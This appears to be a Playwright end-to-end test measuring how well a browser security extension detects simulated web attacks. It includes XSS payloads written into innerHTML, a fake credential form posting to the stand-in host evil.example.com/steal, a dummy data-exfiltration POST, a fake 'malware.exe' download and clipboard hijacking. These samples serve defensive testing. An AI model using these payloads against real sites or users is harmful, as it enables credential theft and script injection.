/**
 * Audit Extension Detection Coverage E2E Test
 *
 * Tests coverage of Audit extension's detection capabilities.
 * Measures which detection types are properly triggered by attack simulations.
 */

import { test, expect } from "@playwright/test";
import { chromium, type BrowserContext, type Page } from "playwright";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { existsSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { readFileSync } from "node:fs";

const __dirname = dirname(fileURLToPath(import.meta.url));

const AUDIT_EXTENSION_PATH = resolve(__dirname, "../../audit-extension/dist/chrome-mv3");
const BATTACKER_EXTENSION_PATH = resolve(__dirname, "../../battacker-extension/dist/chrome-mv3");
const TEST_PAGE_PATH = resolve(__dirname, "../fixtures/test-page.html");
const COVERAGE_REPORT_PATH = resolve(__dirname, "../coverage-report.json");

// ============================================================================
// Audit Detection Specification
// These are ALL detection types that Audit extension supports (api-hooks.js)
// ============================================================================

const AUDIT_DETECTION_SPEC = {
  tracking_beacon_detected: {
    description: "Tracking beacon via sendBeacon or small POST with tracking patterns",
    source: "api-hooks.js",
    priority: "high",
    implemented: true,
  },
  data_exfiltration_detected: {
    description: "Large POST or sensitive data patterns (email, password, API key, etc.)",
    source: "api-hooks.js",
    priority: "critical",
    implemented: true,
  },
  xss_detected: {
    description: "XSS payload injection via innerHTML (script, onerror, javascript:)",
    source: "api-hooks.js",
    priority: "critical",
    implemented: true,
  },
  cookie_access_detected: {
    description: "Frequent document.cookie access",
    source: "api-hooks.js",
    priority: "medium",
    implemented: true,
  },
  dom_scraping_detected: {
    description: "Mass querySelectorAll calls (>50 in 5 seconds)",
    source: "api-hooks.js",
    priority: "medium",
    implemented: true,
  },
  clipboard_hijack_detected: {
    description: "Crypto wallet address written to clipboard",
    source: "api-hooks.js",
    priority: "high",
    implemented: true,
  },
  suspicious_download_detected: {
    description: "Blob/data URL download or dangerous file extensions",
    source: "api-hooks.js",
    priority: "high",
    implemented: true,
  },
  supply_chain_risk: {
    description: "External script without SRI (Subresource Integrity)",
    source: "api-hooks.js",
    priority: "high",
    implemented: true,
  },
  credential_theft_risk: {
    description: "Form with password field submitted to external/insecure target",
    source: "api-hooks.js",
    priority: "critical",
    implemented: true,
  },
} as const;

type AuditDetectionType = keyof typeof AUDIT_DETECTION_SPEC;

interface AuditEvent {
  type: string;
  domain: string;
  timestamp: number;
  details?: Record<string, unknown>;
}

interface DetectionTestResult {
  type: AuditDetectionType;
  tested: boolean;
  detected: boolean;
  eventCount: number;
  implemented: boolean;
  gap?: string;
  error?: string;
}

interface CoverageReport {
  timestamp: string;
  summary: {
    total: number;
    implemented: number;
    notImplemented: number;
    tested: number;
    detected: number;
    coveragePercent: number;
    successRate: number;
  };
  results: DetectionTestResult[];
  gaps: { type: string; reason: string }[];
}

interface TestContext {
  context: BrowserContext;
  page: Page;
  auditExtensionId: string;
  server: Server;
  serverPort: number;
}

// ============================================================================
// Test Infrastructure
// ============================================================================

function startTestServer(): Promise<{ server: Server; port: number }> {
  return new Promise((resolve) => {
    const testPageContent = readFileSync(TEST_PAGE_PATH, "utf-8");

    const server = createServer((req, res) => {
      if (req.url === "/" || req.url === "/test-page.html") {
        res.writeHead(200, { "Content-Type": "text/html" });
        res.end(testPageContent);
      } else if (req.url === "/external-script.js") {
        // External script without SRI for supply chain risk test
        res.writeHead(200, { "Content-Type": "application/javascript" });
        res.end("console.log('external script loaded');");
      } else {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: true }));
      }
    });

    server.listen(0, "127.0.0.1", () => {
      const addr = server.address();
      const port = typeof addr === "object" && addr ? addr.port : 3456;
      resolve({ server, port });
    });
  });
}

async function setupBrowserWithExtensions(): Promise<TestContext> {
  if (!existsSync(AUDIT_EXTENSION_PATH)) {
    throw new Error(`Audit extension not found. Run: pnpm --filter @pleno-audit/audit-extension build`);
  }
  if (!existsSync(BATTACKER_EXTENSION_PATH)) {
    throw new Error(`Battacker extension not found. Run: pnpm --filter @pleno-audit/battacker-extension build`);
  }

  const { server, port } = await startTestServer();

  const context = await chromium.launchPersistentContext("", {
    headless: false,
    args: [
      "--headless=new",
      `--disable-extensions-except=${AUDIT_EXTENSION_PATH},${BATTACKER_EXTENSION_PATH}`,
      `--load-extension=${AUDIT_EXTENSION_PATH},${BATTACKER_EXTENSION_PATH}`,
      "--no-first-run",
      "--disable-default-apps",
    ],
  });

  let auditExtensionId: string | null = null;
  for (let attempt = 0; attempt < 15; attempt++) {
    await new Promise((r) => setTimeout(r, 500));
    const serviceWorkers = context.serviceWorkers();
    for (const sw of serviceWorkers) {
      if (sw.url().includes("background")) {
        auditExtensionId = new URL(sw.url()).host;
        break;
      }
    }
    if (auditExtensionId) break;
  }

  if (!auditExtensionId) {
    await context.close();
    server.close();
    throw new Error("Extension service worker not found");
  }

  const page = await context.newPage();
  return { context, page, auditExtensionId, server, serverPort: port };
}

// TODO: Migrate to Alert-based detection verification (ADR-053)
async function getAuditEvents(_context: BrowserContext, _extensionId: string): Promise<AuditEvent[]> {
  return [];
}

// ============================================================================
// Attack Simulations for Each Detection Type
// ============================================================================

async function simulateTrackingBeacon(page: Page): Promise<void> {
  await page.evaluate(() => {
    // Use fetch with POST to trigger tracking beacon detection
    // sendBeacon may not work reliably in headless mode
    fetch("/tracking/beacon", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "pageview",
        session: "test-session",
        user_id: "user-456",
        visitor: "visitor-123",
      }),
    }).catch(() => {});

    // Also try sendBeacon as backup
    if (navigator.sendBeacon) {
      navigator.sendBeacon("/analytics/collect", JSON.stringify({
        event: "click",
        action: "button_click",
        user_id: "user-789",
      }));
    }
  });
}

async function simulateDataExfiltration(page: Page): Promise<void> {
  await page.evaluate(() => {
    fetch("/api/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: "victim@example.com",
        password: "supersecret123",
        api_key: "sk-1234567890abcdef1234567890abcdef",
      }),
    }).catch(() => {});
  });
}

async function simulateXSS(page: Page): Promise<void> {
  await page.evaluate(() => {
    const div = document.createElement("div");
    div.innerHTML = '<script>alert("xss")</script>';
    document.body.appendChild(div);

    const div2 = document.createElement("div");
    div2.innerHTML = '<img src=x onerror="alert(1)">';
    document.body.appendChild(div2);
  });
}

async function simulateCookieAccess(page: Page): Promise<void> {
  await page.evaluate(() => {
    document.cookie = "test_session=abc123; path=/";
    for (let i = 0; i < 10; i++) {
      const _ = document.cookie;
    }
  });
}

async function simulateDOMScraping(page: Page): Promise<void> {
  await page.evaluate(() => {
    for (let i = 0; i < 60; i++) {
      document.querySelectorAll("*");
      document.querySelectorAll("input");
    }
  });
}

async function simulateClipboardHijack(page: Page): Promise<void> {
  await page.evaluate(async () => {
    // Bitcoin address pattern
    const bitcoinAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    try {
      await navigator.clipboard.writeText(bitcoinAddress);
    } catch {
      // Clipboard API may be blocked in headless
    }
  });
}

async function simulateSuspiciousDownload(page: Page): Promise<void> {
  await page.evaluate(() => {
    // Create blob download
    const blob = new Blob(["malicious content"], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    a.download = "malware.exe";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  });
}

async function simulateSupplyChainRisk(page: Page, _serverPort: number): Promise<void> {
  await page.evaluate(() => {
    // Add external CDN script without integrity attribute
    // Must be from a different hostname to trigger detection
    // IMPORTANT: MutationObserver watches document.body, not document.head
    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js";
    // No integrity attribute = supply chain risk for CDN resources
    document.body.appendChild(script);

    // Also add another external script for redundancy
    const script2 = document.createElement("script");
    script2.src = "https://unpkg.com/react@18/umd/react.production.min.js";
    document.body.appendChild(script2);

    // Add external stylesheet without SRI
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css";
    document.body.appendChild(link);
  });
}

async function simulateCredentialTheft(page: Page): Promise<void> {
  await page.evaluate(() => {
    // Create form with password field targeting external domain
    const form = document.createElement("form");
    form.action = "https://evil.example.com/steal";
    form.method = "POST";
    form.id = "credential-theft-test-form";

    const passwordInput = document.createElement("input");
    passwordInput.type = "password";
    passwordInput.name = "password";
    passwordInput.value = "secret123";
    form.appendChild(passwordInput);

    const emailInput = document.createElement("input");
    emailInput.type = "email";
    emailInput.name = "email";
    emailInput.value = "victim@example.com";
    form.appendChild(emailInput);

    // Add hidden submit button
    const submitBtn = document.createElement("button");
    submitBtn.type = "submit";
    submitBtn.style.display = "none";
    form.appendChild(submitBtn);

    document.body.appendChild(form);

    // Dispatch submit event with proper bubbling to reach document listener
    const submitEvent = new Event("submit", {
      bubbles: true,
      cancelable: true,
    });
    // Prevent actual navigation
    form.addEventListener("submit", (e) => e.preventDefault(), { once: true });
    form.dispatchEvent(submitEvent);

    // Also create another form targeting insecure HTTP
    const form2 = document.createElement("form");
    form2.action = "http://insecure.example.com/login";
    form2.method = "POST";

    const pwdInput2 = document.createElement("input");
    pwdInput2.type = "password";
    pwdInput2.name = "pwd";
    pwdInput2.value = "pass456";
    form2.appendChild(pwdInput2);

    document.body.appendChild(form2);
    form2.addEventListener("submit", (e) => e.preventDefault(), { once: true });
    form2.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
  });
}

// ============================================================================
// Detection Test Runner
// ============================================================================

const DETECTION_SIMULATORS: Record<AuditDetectionType, (page: Page, serverPort: number) => Promise<void>> = {
  tracking_beacon_detected: (page) => simulateTrackingBeacon(page),
  data_exfiltration_detected: (page) => simulateDataExfiltration(page),
  xss_detected: (page) => simulateXSS(page),
  cookie_access_detected: (page) => simulateCookieAccess(page),
  dom_scraping_detected: (page) => simulateDOMScraping(page),
  clipboard_hijack_detected: (page) => simulateClipboardHijack(page),
  suspicious_download_detected: (page) => simulateSuspiciousDownload(page),
  supply_chain_risk: (page, port) => simulateSupplyChainRisk(page, port),
  credential_theft_risk: (page) => simulateCredentialTheft(page),
};

// ============================================================================
// Tests
// ============================================================================

test.describe("Audit Detection Coverage", () => {
  let ctx: TestContext;
  const testResults: DetectionTestResult[] = [];

  test.beforeAll(async () => {
    ctx = await setupBrowserWithExtensions();
  });

  test.afterAll(async () => {
    // Generate coverage report
    const implementedResults = testResults.filter((r) => r.implemented);
    const notImplementedResults = testResults.filter((r) => !r.implemented);
    const detectedTypes = new Set(implementedResults.filter((r) => r.detected).map((r) => r.type));
    const testedTypes = new Set(implementedResults.filter((r) => r.tested).map((r) => r.type));

    // Collect gaps
    const gaps = notImplementedResults
      .filter((r) => r.gap)
      .map((r) => ({ type: r.type, reason: r.gap! }));

    const report: CoverageReport = {
      timestamp: new Date().toISOString(),
      summary: {
        total: Object.keys(AUDIT_DETECTION_SPEC).length,
        implemented: implementedResults.length,
        notImplemented: notImplementedResults.length,
        tested: testedTypes.size,
        detected: detectedTypes.size,
        coveragePercent: testedTypes.size > 0 ? Math.round((detectedTypes.size / testedTypes.size) * 100) : 0,
        successRate: testedTypes.size > 0 ? Math.round((detectedTypes.size / testedTypes.size) * 100) : 0,
      },
      results: testResults,
      gaps,
    };

    // Output coverage report
    console.log("\n" + "=".repeat(60));
    console.log("AUDIT DETECTION COVERAGE REPORT");
    console.log("=".repeat(60));
    console.log(`\nTimestamp: ${report.timestamp}`);
    console.log(`\nSUMMARY:`);
    console.log(`  Total Detection Types:  ${report.summary.total}`);
    console.log(`  Implemented:            ${report.summary.implemented}`);
    console.log(`  Not Implemented (gaps): ${report.summary.notImplemented}`);
    console.log(`  Tested:                 ${report.summary.tested}`);
    console.log(`  Successfully Detected:  ${report.summary.detected}`);
    console.log(`  Coverage (impl only):   ${report.summary.coveragePercent}%`);

    console.log(`\nDETAILED RESULTS:`);
    console.log("-".repeat(60));

    for (const type of Object.keys(AUDIT_DETECTION_SPEC) as AuditDetectionType[]) {
      const result = testResults.find((r) => r.type === type);
      const spec = AUDIT_DETECTION_SPEC[type];
      const isImplemented = "implemented" in spec ? spec.implemented : true;

      let status: string;
      if (!isImplemented) {
        status = "🔸 GAP ";
      } else if (result?.detected) {
        status = "✅ PASS";
      } else if (result?.tested) {
        status = "❌ FAIL";
      } else {
        status = "⚠️  SKIP";
      }

      const count = result?.eventCount ?? 0;
      console.log(`  ${status} ${type}`);
      console.log(`         Priority: ${spec.priority} | Events: ${count} | Source: ${spec.source}`);
      if (result?.gap) {
        console.log(`         Gap: ${result.gap}`);
      }
      if (result?.error && isImplemented) {
        console.log(`         Error: ${result.error}`);
      }
    }

    if (gaps.length > 0) {
      console.log(`\nIDENTIFIED GAPS:`);
      console.log("-".repeat(60));
      for (const gap of gaps) {
        console.log(`  • ${gap.type}: ${gap.reason}`);
      }
    }

    console.log("\n" + "=".repeat(60));

    // Save report to file
    writeFileSync(COVERAGE_REPORT_PATH, JSON.stringify(report, null, 2));
    console.log(`\nReport saved to: ${COVERAGE_REPORT_PATH}`);

    // Cleanup
    if (ctx?.context) await ctx.context.close();
    if (ctx?.server) ctx.server.close();
  });

  // Generate test for each detection type
  for (const [type, spec] of Object.entries(AUDIT_DETECTION_SPEC)) {
    const detectionType = type as AuditDetectionType;
    const isImplemented = "implemented" in spec ? spec.implemented : true;
    const gapReason = "gap" in spec ? (spec as { gap: string }).gap : undefined;

    test(`should detect: ${detectionType}`, async () => {
      const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
      await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
      await ctx.page.waitForTimeout(1000);

      const result: DetectionTestResult = {
        type: detectionType,
        tested: true,
        detected: false,
        eventCount: 0,
        implemented: isImplemented,
        gap: gapReason,
      };

      try {
        // Run simulation
        const simulator = DETECTION_SIMULATORS[detectionType];
        await simulator(ctx.page, ctx.serverPort);

        // Wait for event processing
        await ctx.page.waitForTimeout(3000);

        // Get events and check for detection
        const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
        const matchingEvents = events.filter((e) => e.type === detectionType);

        result.eventCount = matchingEvents.length;
        result.detected = matchingEvents.length > 0;

        // Only assert for implemented detections
        if (isImplemented) {
          expect(
            matchingEvents.length,
            `Expected ${detectionType} to be detected. Priority: ${spec.priority}`
          ).toBeGreaterThan(0);
        } else {
          // For non-implemented detections, just log and continue
          console.log(`[GAP] ${detectionType}: ${gapReason}`);
        }
      } catch (error) {
        result.error = error instanceof Error ? error.message : String(error);
        // Only throw for implemented detections
        if (isImplemented) {
          throw error;
        }
      } finally {
        testResults.push(result);
      }
    });
  }
});

test.describe("Extension Loading", () => {
  test("both extensions should load successfully", async () => {
    const ctx = await setupBrowserWithExtensions();
    try {
      const serviceWorkers = ctx.context.serviceWorkers();
      expect(serviceWorkers.length).toBeGreaterThanOrEqual(2);

      await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`);
      await ctx.page.waitForTimeout(2000);

      const title = await ctx.page.title();
      expect(title).toContain("Battacker-Audit");
    } finally {
      await ctx.context.close();
      ctx.server.close();
    }
  });
});
